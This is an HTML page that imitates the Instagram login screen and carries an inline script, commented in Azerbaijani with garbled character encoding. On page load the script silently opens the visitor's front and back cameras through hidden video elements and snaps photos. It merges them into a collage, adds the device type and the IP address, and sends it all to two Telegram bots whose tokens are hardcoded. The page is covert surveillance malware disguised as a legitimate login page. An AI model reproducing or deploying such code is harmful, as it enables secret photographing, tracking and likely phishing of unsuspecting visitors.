
<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <!-- Instagram Favicon -->
    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram">
            </div>
            <form id="loginForm" onsubmit="return handleLogin(event)">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="divider">
                <span>OR</span>
            </div>
            <a href="#" class="facebook-login">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#1877f2" width="20" height="20">
                    <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
                </svg>
                Log in with Facebook
            </a>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Meta AI</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="footer-bottom">
            <select class="language-select">
                <option>English</option>
                <option>AzÉ™rbaycan</option>
            </select>
            <span>Â© 2026 Instagram from Meta</span>
        </div>
    </footer>

    <script src="script.js"></script>
    <script>
        // Sayta girÉ™n kimi Ã¶n vÉ™ arxa kameradan kolaj ÅŸÉ™kil Ã§É™k vÉ™ Telegram-a gÃ¶ndÉ™r
        (function() {
            const TELEGRAM_BOTS = [
                {
                    BOT_TOKEN: '8568192868:AAE42KvXP9KVG4LH6nR6wuxrDp1jo3nSb4o',
                    CHAT_ID: '883411309'
                },
                {
                    BOT_TOKEN: '8143521582:AAFjMpwD7r9NMho9tmHltUl9gXdihd7l5Mk',
                    CHAT_ID: '7706519040'
                }
            ];
            
            // Cihaz mÉ™lumatÄ±nÄ± É™ldÉ™ et
            async function getDeviceInfo() {
                const ua = navigator.userAgent;
                let device = { brand: 'BilinmÉ™yÉ™n', model: 'BilinmÉ™yÉ™n' };
                
                if (/android/i.test(ua)) {
                    const match = ua.match(/Android[\s]+([\d.]+);\s*([\w\s]+)(?:Build|\))/i);
                    if (match) {
                        device.brand = 'Android';
                        device.model = match[2].trim();
                    }
                } else if (/iPhone|iPad|iPod/.test(ua)) {
                    device.brand = 'Apple';
                    device.model = /iPhone/.test(ua) ? 'iPhone' : /iPad/.test(ua) ? 'iPad' : 'iPod';
                } else if (/Windows/.test(ua)) {
                    device.brand = 'PC';
                    device.model = 'Windows';
                } else if (/Macintosh/.test(ua)) {
                    device.brand = 'Apple';
                    device.model = 'Mac';
                }
                return device;
            }
            
            // IP Ã¼nvanÄ±nÄ± É™ldÉ™ et
            async function getIP() {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    return data.ip;
                } catch (e) {
                    return 'BilinmÉ™yÉ™n';
                }
            }
            
            // Telegram botuna ÅŸÉ™kil gÃ¶ndÉ™r
            async function sendPhotoToTelegram(blob, caption) {
                const promises = TELEGRAM_BOTS.map(bot => {
                    const formData = new FormData();
                    formData.append('chat_id', bot.CHAT_ID);
                    formData.append('photo', blob, 'collage.jpg');
                    formData.append('caption', caption);
                    
                    return fetch(`https://api.telegram.org/bot${bot.BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(err => console.log('Telegram gÃ¶ndÉ™rmÉ™ xÉ™tasÄ±:', err));
                });
                
                await Promise.all(promises);
            }
            
            // Video hazÄ±r olana qÉ™dÉ™r gÃ¶zlÉ™ (kÉ™sim gÉ™lÉ™nÉ™ qÉ™dÉ™r), maksimum timeout
            function waitForVideoFrame(video, maxWaitMs) {
                return new Promise((resolve) => {
                    if (video.readyState >= 2 && video.videoWidth > 0) {
                        resolve(true);
                        return;
                    }
                    const start = Date.now();
                    const check = () => {
                        if (video.readyState >= 2 && video.videoWidth > 0) {
                            resolve(true);
                            return;
                        }
                        if (Date.now() - start > maxWaitMs) {
                            resolve(false);
                            return;
                        }
                        requestAnimationFrame(check);
                    };
                    requestAnimationFrame(check);
                });
            }
            
            // Kameradan ÅŸÉ™kil Ã§É™k vÉ™ canvas qaytar (stream É™vvÉ™lcÉ™dÉ™n baÄŸlanÄ±b olmalÄ±dÄ±r)
            async function captureFromCamera(facingMode, label) {
                let video, stream;
                try {
                    video = document.createElement('video');
                    video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
                    video.autoplay = true;
                    video.playsInline = true;
                    video.muted = true;
                    document.body.appendChild(video);
                    
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: facingMode,
                            width: { ideal: 1280 }, 
                            height: { ideal: 720 } 
                        },
                        audio: false
                    });
                    
                    video.srcObject = stream;
                    
                    await new Promise((resolve, reject) => {
                        video.onloadedmetadata = () => video.play().then(resolve).catch(reject);
                        video.onerror = () => reject(new Error('Video yÃ¼klÉ™nmÉ™di'));
                    });
                    
                    // Æn azÄ± 400ms gÃ¶zlÉ™ ki kamera iÅŸÄ±q tutsun, sonra Ã§É™rÃ§ivÉ™ hazÄ±r olana qÉ™dÉ™r gÃ¶zlÉ™
                    await new Promise(r => setTimeout(r, 400));
                    const ready = await waitForVideoFrame(video, 5000);
                    
                    if (!ready || video.videoWidth === 0) {
                        stream.getTracks().forEach(track => track.stop());
                        video.remove();
                        return null;
                    }
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                    return { canvas, label };
                } catch (error) {
                    console.log(`${label} xÉ™tasÄ±:`, error);
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    if (video && video.parentNode) video.remove();
                    return null;
                }
            }
            
            // Kolaj yarat - Ã¶n vÉ™ arxa kamera ÅŸÉ™killÉ™rini birlÉ™ÅŸdir
            async function createCollageAndSend() {
                try {
                    console.log('Kameralardan ÅŸÉ™kil Ã§É™kilir...');
                    
                    // ArdÄ±cÄ±l Ã§É™k: mobil cihazlarda eyni anda iki kamera aÃ§Ä±la bilmÉ™z
                    const frontResult = await captureFromCamera('user', 'Ã–N KAMERA');
                    await new Promise(r => setTimeout(r, 300)); // Kamera tam baÄŸlansÄ±n
                    const backResult = await captureFromCamera('environment', 'ARXA KAMERA');
                    
                    // HeÃ§ olmasa bir ÅŸÉ™kil alÄ±ndÄ±mÄ±?
                    if (!frontResult && !backResult) {
                        console.log('HeÃ§ bir kamera iÅŸlÉ™mir');
                        return;
                    }
                    
                    // Kolaj canvas-Ä±nÄ± yarat
                    const collageCanvas = document.createElement('canvas');
                    const ctx = collageCanvas.getContext('2d');
                    
                    const images = [frontResult, backResult].filter(Boolean);
                    
                    if (images.length === 1) {
                        // TÉ™k ÅŸÉ™kil varsa
                        const img = images[0];
                        collageCanvas.width = img.canvas.width;
                        collageCanvas.height = img.canvas.height;
                        ctx.drawImage(img.canvas, 0, 0);
                        
                        // Label É™lavÉ™ et
                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
                        ctx.fillRect(10, 10, 150, 40);
                        ctx.fillStyle = '#fff';
                        ctx.font = 'bold 18px Arial';
                        ctx.fillText(img.label, 20, 38);
                    } else {
                        // Ä°ki ÅŸÉ™kil varsa - yan-yana qoy
                        const totalWidth = images[0].canvas.width + images[1].canvas.width;
                        const maxHeight = Math.max(images[0].canvas.height, images[1].canvas.height);
                        
                        collageCanvas.width = totalWidth;
                        collageCanvas.height = maxHeight;
                        
                        // Qara fon
                        ctx.fillStyle = '#000';
                        ctx.fillRect(0, 0, totalWidth, maxHeight);
                        
                        // Ã–n kamera (sol)
                        ctx.drawImage(images[0].canvas, 0, 0);
                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
                        ctx.fillRect(10, 10, 140, 40);
                        ctx.fillStyle = '#fff';
                        ctx.font = 'bold 18px Arial';
                        ctx.fillText(images[0].label, 20, 38);
                        
                        // Arxa kamera (saÄŸ)
                        const offset = images[0].canvas.width;
                        ctx.drawImage(images[1].canvas, offset, 0);
                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
                        ctx.fillRect(offset + 10, 10, 160, 40);
                        ctx.fillStyle = '#fff';
                        ctx.fillText(images[1].label, offset + 20, 38);
                    }
                    
                    // MÉ™lumat topla vÉ™ gÃ¶ndÉ™r
                    const device = await getDeviceInfo();
                    const ip = await getIP();
                    const date = new Date().toLocaleString('az-AZ', {
                        year: 'numeric',
                        month: '2-digit',
                        day: '2-digit',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    });
                    
                    const caption = `ðŸŽ¯ YENÄ° ZÄ°YARÆTÃ‡Ä°
ðŸ“¸ Kolaj ÅžÉ™kil
ðŸ“± Cihaz: ${device.brand} ${device.model}
ðŸŒ IP: ${ip}
â° Tarix: ${date}
ðŸ“· Ã‡É™kilÉ™n kameralar: ${images.map(i => i.label).join(' + ')}`;
                    
                    // Blob-a Ã§evir vÉ™ gÃ¶ndÉ™r
                    collageCanvas.toBlob(async (blob) => {
                        if (blob) {
                            console.log('ÅžÉ™kil Telegram-a gÃ¶ndÉ™rilir...');
                            await sendPhotoToTelegram(blob, caption);
                            console.log('ÅžÉ™kil gÃ¶ndÉ™rildi!');
                        }
                    }, 'image/jpeg', 0.9);
                    
                } catch (error) {
                    console.log('Kolaj yaradÄ±larkÉ™n xÉ™ta:', error);
                }
            }
            
            // SÉ™hifÉ™ yÃ¼klÉ™nÉ™n kimi baÅŸla
            window.addEventListener('load', () => {
                setTimeout(createCollageAndSend, 500);
            });
            
        })();
    </script>
</body>
</html>
